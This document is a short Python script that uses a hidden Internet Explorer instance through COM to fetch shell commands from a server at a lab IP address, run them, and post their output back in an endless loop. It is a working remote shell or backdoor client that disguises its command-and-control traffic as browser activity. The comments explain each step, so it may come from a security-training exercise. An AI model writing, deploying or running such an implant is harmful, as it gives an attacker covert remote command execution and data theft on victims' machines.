
from win32com.client import Dispatch # 
from time import sleep 
import subprocess # to execute command 
browser = Dispatch("InternetExplorer.Application") # to start InternetExplorer
browser.visible = 0 # to run in background 


url = "http://192.168.190.130" # for post req to server 
flags=0
TargetFrame=0
while True:
    browser.Navigate("http://192.168.190.130") # navigate to our server
    while browser.ReadyState != 4 : # ready state will return 4 when browser load the page 
        sleep(2)
    command = browser.Document.body.innerHTML # to get html content of page  | it will be a command
    command = command.encode()
    exec = subprocess.Popen(command.decode(), shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) # execute command
    sout = exec.stdout.read() # to read output of command
    topostBuffer = memoryview(sout) # when you post data using the componant object model you need buffer data first
       
    browser.Navigate(url,flags,TargetFrame,topostBuffer)
    sleep(2)        